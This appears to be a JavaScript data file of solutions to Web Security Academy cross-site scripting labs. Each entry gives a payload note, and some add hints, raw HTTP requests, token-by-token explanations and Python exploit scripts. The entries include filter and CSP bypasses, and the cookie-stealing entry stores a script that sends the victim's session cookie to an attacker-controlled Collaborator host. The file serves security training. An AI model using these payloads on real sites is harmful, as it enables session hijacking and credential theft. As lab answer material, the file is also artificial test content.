export default {
  'xss-reflected-lab-html-context-nothing-encoded': {
    note: 'The search term is concatenated into HTML with no encoding, so the browser opens a tag instead of printing text.',
    work: {
      hints: [
        'Send a unique string in the search parameter and view source. Is it between tags, inside an attribute, or inside a script?',
        'It lands in HTML data state between heading tags. Nothing is encoded, so `<` is a tag opener to the tokenizer.',
        'Use `?search=<script>alert(1)</script>`, or `<img src=x onerror=alert(1)>` if script tags are filtered.'
      ],
      approach:
        'Reflected XSS in the simplest possible context. The server writes the parameter into the response body without HTML-encoding it. The browser has no way to know the bytes came from a query string, so it parses them as markup.',
      request: `GET /?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Connection: close`,
      tokens: [
        ['<', 'In data state this moves the tokenizer to "tag open". It is the exact byte HTML-encoding would have turned into &lt;.'],
        ['script', 'Tag name. The tree builder creates a script element, not text.'],
        ['>', 'Ends the start tag; the tokenizer switches to script-data state.'],
        ['alert(1)', 'Character data inside the script element, handed to the JavaScript parser.'],
        ['</script>', 'The only sequence that leaves script-data state, so the rest of the page still parses.']
      ],
      script: `import sys, requests

host = sys.argv[1]                      # e.g. 0a1b...web-security-academy.net
payload = "<script>alert(1)</script>"
r = requests.get(f"https://{host}/", params={"search": payload}, timeout=20)
print(r.status_code, "reflected:", payload in r.text)`
    }
  },

  'xss-stored-lab-html-context-nothing-encoded': {
    note: 'A comment body is persisted and rendered as HTML, so the payload executes for every later visitor.'
  },

  'xss-lab-document-write-sink': {
    note: '`document.write` feeds `location.search` straight into the HTML parser, which executes an injected image handler.'
  },

  'xss-lab-innerhtml-sink': {
    note: 'The hash (or query) reaches `innerHTML`; `<img onerror>` fires even though `<script>` would not.'
  },

  'xss-lab-jquery-href-attribute-sink': {
    note: 'jQuery writes `location.search` into an anchor `href`, creating a `javascript:` URL that runs on click.'
  },

  'xss-lab-jquery-selector-hash-change-event': {
    note: '`$(location.hash)` treats a string beginning with `<` as HTML, so the hash becomes a DOM element with a handler.'
  },

  'xss-lab-attribute-angle-brackets-html-encoded': {
    note: 'Angle brackets are encoded but the double quote is not: close the `value` attribute and add an event handler.',
    work: {
      hints: [
        'Find the reflection. It is inside `value="..."` on the search input, not between tags.',
        '`<` and `>` become entities, but `"` survives. A quote ends the attribute value; everything after it is parsed as new attributes.',
        'Send `" autofocus onfocus="alert(1)` — the trailing quote from the template closes the handler value.'
      ],
      approach:
        'The application encodes `<>` but reflects the quote verbatim. Attribute context needs quote-aware escaping, not just tag-aware escaping. Once the value is closed, the remaining bytes are attribute syntax on the same element.',
      request: `GET /?search=%22%20autofocus%20onfocus%3D%22alert(1) HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Connection: close`,
      tokens: [
        ['"', 'Closes the double-quoted value attribute. HTML-encoding would have produced &quot;.'],
        ['autofocus', 'A boolean attribute: the browser focuses this input during page load without user interaction.'],
        ['onfocus=', 'Declares an intrinsic event handler. Its value is compiled by the JavaScript parser.'],
        ['"alert(1)', 'Opens the handler value and supplies the statement. The template\'s own closing quote terminates it.'],
        ['(implicit)', 'No `javascript:` scheme and no `<script>` tag are needed; the event fires on focus.']
      ],
      script: `import sys, requests

host = sys.argv[1]
payload = '" autofocus onfocus="alert(1)'
r = requests.get(f"https://{host}/", params={"search": payload}, timeout=20)
print(r.status_code, "reflected:", "autofocus" in r.text)`
    }
  },

  'xss-lab-href-attribute-double-quotes-html-encoded': {
    note: 'The website field becomes an anchor `href`; a `javascript:` URL executes when the link is clicked.'
  },

  'xss-lab-javascript-string-angle-brackets-html-encoded': {
    note: 'Angle brackets are encoded but the string literal is not quote-escaped: `\'-alert(1)-\'` becomes code.'
  },

  'xss-lab-document-write-sink-inside-select-element': {
    note: 'Input is written inside a `<select>`; close the element and inject an image handler to escape the form control context.'
  },

  'xss-lab-angularjs-expression': {
    note: 'AngularJS compiles reflected input as a template; `{{constructor.constructor(\'alert(1)\')()}}` reaches Function.'
  },

  'xss-lab-dom-xss-reflected': {
    note: 'The server JSON-encodes the search term and the client `eval`s it; break out of the JSON string to inject code.'
  },

  'xss-lab-dom-xss-stored': {
    note: 'A stored comment is inserted with `innerHTML` by client code; break the attribute and use `<img onerror>`.'
  },

  'xss-lab-html-context-with-most-tags-and-attributes-blocked': {
    note: 'The blocklist omits an event that fires automatically; `<body onresize=alert(1)>` triggers when the viewport changes.'
  },

  'xss-lab-html-context-with-all-standard-tags-blocked': {
    note: 'Standard tags are blocked, but the parser accepts custom elements: `<xss autofocus tabindex=1 onfocus=alert(1)>`.'
  },

  'xss-lab-some-svg-markup-allowed': {
    note: 'The SVG namespace allows animation events; `<svg><animatetransform onbegin=alert(1)>` runs without interaction.'
  },

  'xss-lab-canonical-link-tag': {
    note: 'Input is reflected into `<link rel="canonical" href>`; add `accesskey` and `onclick` to create a keyboard-triggered handler.'
  },

  'xss-lab-javascript-string-single-quote-backslash-escaped': {
    note: 'Quotes and backslashes are escaped but angle brackets are not, so `</script><script>alert(1)</script>` closes the script block.'
  },

  'xss-lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped': {
    note: 'Single quotes are backslash-escaped but backslashes are not: one backslash disables the escape and frees the quote.',
    work: {
      hints: [
        'Locate the reflection: `var searchTerms = \'...\'` inside a script block.',
        'The server turns `\'` into `\\\'`, but leaves `\\` alone. Send a backslash and watch what happens to the escape it adds.',
        'Payload: `\\\';alert(1)//` — the backslash escapes the added backslash, the quote closes the string, `//` removes the template\'s trailing quote.'
      ],
      approach:
        'This is an escaping-order bug. A correct JavaScript-string encoder escapes backslash *and* quote, and does so in a single pass. Escaping only the quote lets attacker input rewrite the escape sequence itself.',
      request: `GET /?search=%5C%27%3Balert(1)%2F%2F HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Connection: close`,
      tokens: [
        ['\\\\', 'Two backslashes in the final source: the attacker\'s plus the one the server prepends. JavaScript reads them as a literal backslash.'],
        ["'", 'Now unescaped, so it terminates the string literal.'],
        [';', 'Ends the assignment statement.'],
        ['alert(1)', 'Parsed as a call expression in the script\'s scope.'],
        ['//', 'Comments out the quote and semicolon the template appends, preventing a syntax error.']
      ],
      script: `import sys, requests

host = sys.argv[1]
payload = "\\\\';alert(1)//"
r = requests.get(f"https://{host}/", params={"search": payload}, timeout=20)
print(r.status_code, "reflected:", "alert(1)" in r.text)`
    }
  },

  'xss-lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped': {
    note: 'HTML entities are decoded after the escaper runs: `&apos;` reaches the handler as a real quote and bypasses the backslash.'
  },

  'xss-lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped': {
    note: 'The value sits in a template literal; `${alert(1)}` interpolates without needing to close the string.'
  },

  'xss-lab-stealing-cookies': {
    note: 'Stored XSS plus a non-HttpOnly session cookie: exfiltrate `document.cookie` to a Collaborator URL.',
    work: {
      hints: [
        'The comment field is stored XSS. Check whether the session cookie is readable from JavaScript (no HttpOnly flag).',
        'You need an out-of-band listener: a Burp Collaborator domain or any HTTP endpoint you control.',
        'Store `<script>fetch(\'https://COLLAB/?c=\'+encodeURIComponent(document.cookie))</script>` and wait for the victim to view the post.'
      ],
      approach:
        'Execution in the victim\'s origin gives read access to any cookie without HttpOnly. The browser sends the request to the attacker domain as a normal image/fetch, so no server-side firewall sees the data leave.',
      request: `POST /post/comment HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=YOUR-SESSION

csrf=TOKEN&postId=1&comment=%3Cscript%3Efetch%28%27https%3A%2F%2FCOLLAB%2F%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%29%3C%2Fscript%3E&name=x&email=x%40x&website=`,
      tokens: [
        ['<script>', 'Stored payload executes in the origin of the lab, with the victim\'s cookies attached to same-origin requests.'],
        ['fetch(', 'Issues an asynchronous GET to an external host. No CORS read is needed; the data is in the URL.'],
        ['COLLAB', 'Attacker-controlled listener. The request itself is the exfiltration channel.'],
        ['document.cookie', 'Returns non-HttpOnly cookies for the current origin as a `; `-separated string.'],
        ['encodeURIComponent', 'Encodes `;`, `=` and spaces so the cookie survives URL parsing and arrives intact.']
      ],
      script: `import sys, requests

host, collab = sys.argv[1], sys.argv[2]
base = f"https://{host}"
s = requests.Session()
page = s.get(f"{base}/post?postId=1", timeout=20).text
csrf = page.split('name="csrf" value="')[1].split('"')[0]
payload = f"<script>fetch('https://{collab}/?c='+encodeURIComponent(document.cookie))</script>"
s.post(f"{base}/post/comment", data={
    "csrf": csrf, "postId": "1", "comment": payload,
    "name": "x", "email": "x@x", "website": ""
}, timeout=20)
print("stored — poll the Collaborator for the cookie")`
    }
  },

  'xss-lab-capturing-passwords': {
    note: 'Inject a fake password form that posts to your listener; password managers and browsers autofill it.'
  },

  'xss-lab-perform-csrf': {
    note: 'Read the CSRF token from the victim\'s DOM, then submit the email-change form with the victim\'s session.'
  },

  'xss-lab-angular-sandbox-escape-without-strings': {
    note: 'Angular sandbox escape without string literals: build `alert(1)` from `toString().constructor` and character codes.'
  },

  'xss-lab-angular-sandbox-escape-and-csp': {
    note: 'Angular expression evaluation is not inline script, so CSP does not block it; obfuscate the expression to dodge filters.'
  },

  'xss-lab-event-handlers-and-href-attributes-blocked': {
    note: 'Event handlers and `href` are blocked, but SVG animation can set an `href` to a `javascript:` URL.'
  },

  'xss-lab-javascript-url-some-characters-blocked': {
    note: 'Several characters are blocked in a `javascript:` URL; use HTML entities and an error handler to rebuild execution.'
  },

  'xss-lab-very-strict-csp-with-dangling-markup-attack': {
    note: 'CSP blocks scripts entirely; inject an unterminated `<img src="//listener?` so the parser puts the CSRF token in the request URL.'
  },

  'xss-lab-csp-bypass': {
    note: 'A token is reflected into the CSP `report-uri`; inject `;script-src-elem \'unsafe-inline\'` to authorise inline scripts.'
  }
}
